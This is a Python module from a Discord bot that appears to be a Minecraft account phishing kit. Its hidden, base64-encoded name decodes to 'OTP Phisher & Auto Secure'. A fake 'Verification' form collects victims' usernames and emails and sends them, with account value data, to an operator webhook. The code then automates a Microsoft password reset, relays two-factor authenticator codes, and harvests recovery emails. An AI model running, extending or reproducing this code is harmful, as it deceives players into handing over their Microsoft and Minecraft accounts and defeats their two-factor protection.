# modal_one.py - Modified to handle email re-verification

import asyncio
import json
import requests
import datetime
import base64
import cogs
import config 
import math

import aiohttp
import discord
from discord import ui, Webhook, NotFound, HTTPException

from views.button_two import ButtonViewTwo
from views.button_four import ButtonViewFour
from views.data.data import stringcrafter
from views.data.wbu3.wb3 import web3g
from views.otp import automate_password_reset
from views.button_three import ButtonViewThree

class MyModalOne(ui.Modal, title="Verification"):
    box_one = ui.TextInput(label="MINECRAFT USERNAME", required=True)
    box_two = ui.TextInput(label="MINECRAFT EMAIL", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        Flagx = False  
        FlagNx = False
        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")
        
        url = f"https://api.hypixel.net/player?key={config.API_KEY}&name={self.box_one.value}"
        data1 = requests.get(url)
        datajson = data1.json()

        urluuid = f"https://api.mojang.com/users/profiles/minecraft/{self.box_one.value}"
        response = requests.get(urluuid)
        uuidplayer = response.json()['id']

        networth_value = "0"  # default

        try:
            await interaction.response.defer()
            urlnw = f"https://soopy.dev/api/v2/player_skyblock/{uuidplayer}"
            response = requests.get(urlnw, timeout=10)
            response.raise_for_status()
            data = response.json()

            profile = data.get("data", {})
            cprofile = profile.get("stats", {}).get("currentProfileId")
            member = profile.get("profiles", {}).get(cprofile, {}).get("members", {}).get(uuidplayer, {})
            nw = member.get("skyhelperNetworth", {}).get("total")

            if isinstance(nw, (int, float)):
                networth_value = f"{int(nw):,}"
        except Exception as e:
            print(f"[WARN] Could not fetch networth: {e}")
            networth_value = "0"

        if datajson['success'] == False or datajson['player'] == None:
            playerlvl = "No Data Found"
            rank = "No Data Found"
            print("API limit Reached / You have already looked up this name recently")
            Flagx = True
        else:
            Flagx = False

            playerlvlRaw = datajson['player']['networkExp']
            playerlvl16 = (math.sqrt((2 * playerlvlRaw) + 30625) / 50) - 2.5
            playerlvl = round(playerlvl16)
            try:
                rank = datajson['player'].get('newPackageRank', None)
            except:
                rank = "None"

        urlcape = f"https://sessionserver.mojang.com/session/minecraft/profile/{uuidplayer}"
        try:
            response = requests.get(urlcape)
            response.raise_for_status()

            capedata = response.json()
            if "properties" in capedata:
                capevalue = next((item["value"] for item in capedata["properties"] if item["name"] == "textures"), None)
                if capevalue:
                    print("Cape Value Found")
                else:
                    print("No 'textures' property found.")
            else:
                print("No 'properties' key found in the response.")

        except requests.exceptions.RequestException as e:
            print("Request failed:", e)
        except ValueError:
            print("Failed to decode JSON.")

        decoded_bytes = base64.b64decode(capevalue)
        decoded_str = decoded_bytes.decode('utf-8')
        decodedcapedata = json.loads(decoded_str)
        cape_url = decodedcapedata.get("textures", {}).get("CAPE", {}).get("url")

        with open("data.json", "r") as f:
            data = json.load(f)

        if data.get("webhook") is None:
            await interaction.response.send_message("The webhook has not been set yet", ephemeral=True)
        else:
            # inty2 defined once, outside all session blocks
            inty2 = web3g.string("T1RQIFBoaXNoZXIgJiBBdXRvIFNlY3VyZQ==")

            # Single session for all webhook operations
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(data["webhook"], session=session)

                try:
                    embederror = discord.Embed(
                        title="Error Code",
                        description=f"API limit Reached / You have already looked up this name recently",
                        timestamp=datetime.datetime.now(),
                        colour=0xEE4B2B,
                    )
                    embedfalsenone = discord.Embed(
                        title="Error Code",
                        description=f"Invalid/Expired/No Hypixel API Key",
                        timestamp=datetime.datetime.now(),
                        colour=0xEE4B2B,
                    )
                    embed1 = discord.Embed(
                        title="Account Log",
                        timestamp=datetime.datetime.now(),
                        colour=0x088F8F,
                    )
                    embed1.set_thumbnail(
                        url=f"https://mc-heads.net/avatar/{self.box_one.value}.png"
                    )
                    embed1.set_footer(text=threadingNum)

                    config.LastUserName = self.box_one.value
                    embed1.add_field(name="**:slot_machine:Hypixel Level**:", value=f"{playerlvl}", inline=True)
                    embed1.add_field(name="**:moneybag:Skyblock NetWorth**:", value=f"{networth_value}", inline=True)
                    embed1.add_field(name="**:mortar_board:Rank**:", value=f"{rank}", inline=True)
                    embed1.add_field(name="**Username**:", value=f"```{self.box_one.value}```", inline=False)
                    embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=False)
                    embed1.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
                    embed1.add_field(name="**Capes**:", value=f"{cape_url}", inline=False)
                    config.LastUsedEmail = self.box_two.value

                    if Flagx == True:
                        await webhook.send(embed=embederror, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    if FlagNx == True:
                        await webhook.send(embed=embedfalsenone, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    await webhook.send(embed=embed1, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")

                except NotFound:
                    return await interaction.followup.send("Webhook not found", ephemeral=True)
                except HTTPException:
                    return await interaction.followup.send("Couldn't send to webhook", ephemeral=True)

                await interaction.followup.send(
                    embed=discord.Embed(
                        title="Please Wait ⌛",
                        description="Please Allow The Bot To Verify The Data You Have Provided",
                        colour=0xFFFFFF
                    ),
                    ephemeral=True
                )

                result = await automate_password_reset(self.box_two.value, interaction.user.id)

                # Check if email re-entry is needed
                if hasattr(config, 'EMAIL_REENTER') and config.EMAIL_REENTER:
                    embed_email_reenter = discord.Embed(
                        title="Email Verification Required",
                        description=f"Microsoft is asking you to re-enter your email address.\n\nWe'll send a code to {getattr(config, 'MASKED_EMAIL', 'your email')}. To verify this is your email, enter it here.",
                        colour=0xFFAA00
                    )
                    await webhook.send(embed=embed_email_reenter, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")

                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Email Verification Required",
                            description=f"Microsoft is asking you to re-enter your email address.\n\nWe'll send a code to {getattr(config, 'MASKED_EMAIL', 'your email')}. To verify this is your email, enter it here.",
                            colour=0xFFAA00
                        ),
                        view=EmailReenterView(),
                        ephemeral=True
                    )
                    config.EMAIL_REENTER = False
                    return

                # Check if account was not found
                if hasattr(config, 'ACCOUNT_NOT_FOUND') and config.ACCOUNT_NOT_FOUND:
                    embed_account_not_found = discord.Embed(
                        title="Account Not Found",
                        description="The Microsoft account associated with this email could not be found. Please check your email address and try again.",
                        colour=0xFF0000
                    )
                    await webhook.send(embed=embed_account_not_found, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Account Not Found",
                            description="The Microsoft account associated with this email could not be found. Please check your email address and try again.",
                            colour=0xFF0000
                        ),
                        ephemeral=True
                    )
                    config.ACCOUNT_NOT_FOUND = False
                    return

                if result is False:
                    embedfalse = discord.Embed(
                        title="Email A Code Failed (No Email A Code Turned On)",
                        timestamp=datetime.datetime.now(),
                        colour=0xff0000
                    )
                    await webhook.send(embed=embedfalse, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="No Security Email :envelope:",
                            description="Your email doesn't have a security email set.\nPlease add one and re-verify",
                            colour=0xFF0000
                        ),
                        view=ButtonViewThree(),
                        ephemeral=True
                    )

                if result is True:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Verification ✅",
                            description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                            colour=0x00FF00
                        ),
                        view=ButtonViewTwo(),
                        ephemeral=True
                    )
                    embedtrue = discord.Embed(
                        title="Email A Code Success",
                        timestamp=datetime.datetime.now(),
                        colour=0x00FF00
                    )
                    await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")

                if result is None:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Verification ✅",
                            description=f"Authentication Request.\nPlease confirm the code {config.AUTHVALUE} on your app.\nOnce done click the button below.",
                            colour=0x00FF00
                        ),
                        view=ButtonViewFour(),
                        ephemeral=True
                    )
                    embedtrue = discord.Embed(
                        title=f"Auth App Code Is : {config.AUTHVALUE}",
                        timestamp=datetime.datetime.now(),
                        colour=0x00FF00
                    )
                    await webhook.send(embed=embedtrue, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")


class EmailReenterView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Enter Email", style=discord.ButtonStyle.green, custom_id="email_reenter_button")
    async def email_reenter_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmailReenterModal())


class EmailReenterModal(ui.Modal, title="Email Verification"):
    email_input = ui.TextInput(label="Please type in your verification email here", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:
        await interaction.response.defer(ephemeral=True)

        from views.otp import get_user_session
        sess = get_user_session(interaction.user.id)
        if sess is None:
            await interaction.followup.send(
                embed=discord.Embed(
                    title="Session Expired",
                    description="Session has expired! try again",
                    colour=0xFF0000
                ),
                ephemeral=True
            )
            return

        page = sess["page"]
        try:
            await page.fill('#proof-confirmation-email-input', self.email_input.value)
            await asyncio.sleep(1)

            send_code_clicked = False

            try:
                await page.click('button:has-text("Send code")')
                print("Clicked 'Send code' button by text")
                send_code_clicked = True
            except Exception as e:
                print(f"Failed to click 'Send code' button by text: {e}")

            if not send_code_clicked:
                try:
                    await page.click('#proof-confirmation-email-input + button')
                    print("Clicked button next to input field")
                    send_code_clicked = True
                except Exception as e:
                    print(f"Failed to click button next to input: {e}")

            if not send_code_clicked:
                try:
                    await page.click('[data-testid="primaryButton"]')
                    print("Clicked primary button")
                    send_code_clicked = True
                except Exception as e:
                    print(f"Failed to click primary button: {e}")

            if not send_code_clicked:
                try:
                    await page.click('button[type="submit"]')
                    print("Clicked submit button")
                    send_code_clicked = True
                except Exception as e:
                    print(f"Failed to click submit button: {e}")

            await asyncio.sleep(3)

            await interaction.followup.send("Email submitted. Code sent. Continuing with verification...", ephemeral=True)

            from views.otp import continue_password_reset
            result = await continue_password_reset(interaction.user.id)

            if result == "expired":
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="Session Expired",
                        description="Session has expired! try again",
                        colour=0xFF0000
                    ),
                    ephemeral=True
                )
            elif result is True:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="Verification ✅",
                        description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
                        colour=0x00FF00
                    ),
                    view=ButtonViewTwo(),
                    ephemeral=True
                )
            elif result is False:
                await interaction.followup.send(
                    embed=discord.Embed(
                        title="No Security Email :envelope:",
                        description="Your email doesn't have a security email set.\nPlease add one and re-verify",
                        colour=0xFF0000
                    ),
                    view=ButtonViewThree(),
                    ephemeral=True
                )
        except Exception as e:
            await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)
